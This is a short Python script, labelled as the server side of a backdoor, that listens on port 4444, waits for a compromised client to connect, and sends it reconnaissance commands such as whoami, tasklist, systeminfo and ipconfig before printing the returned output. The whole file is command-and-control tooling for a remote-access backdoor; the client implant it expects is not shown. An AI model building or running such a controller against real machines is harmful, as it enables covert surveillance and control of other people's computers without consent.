#backdoor_server_side
import socket
import os

SERVER_HOST = "192.168.43.127" #Input Server device's ip address
SERVER_PORT = 4444 #Input Server device's Port

server = socket.socket()
server.bind((SERVER_HOST,SERVER_PORT))
print("[+] Server Started..")
print("[+] Listening for Client Connection...")
server.listen(1)
client, client_addr = server.accept()
print( f"[+] {client_addr} Client connected to the server")

#Define the available commands
commands = {
    "ipconfig":"Check the client IP Address",
    "dir":"List directory contents",
    "tasklist":"List current running process",
    "systeminfo":"Show the system informations",
    "nestat":"Print network connections",
    "whoami":"Print current user info"
}

# Print out the available commands

print("Avilable Commands: ")
for key, value in commands.items():
    print(f"{key}:{value} \n")
    

while True:
    #Get the user's command choice
    command = input("\n Enter a commands (hint: type 'help' for options): ")
    if command == "help":
        #If user enters 'help' command, show the available commands again
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Available Commands: ")
        for key, value in commands.items():
            print(f"{key}:{value}")
        continue
    # Verify the command is valid
    if command not in commands.keys():
        print("Your command is invalid..TwT. \n Please Enter 'help' for options.")
        continue
    # Send the command to the client 
    command = command.encode()
    client.send(command)
    print("\n [+] Command was sent \n")
    
    #Receive the output from the client and print it out
    output = client.recv(4096).decode()
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"Output: {output}")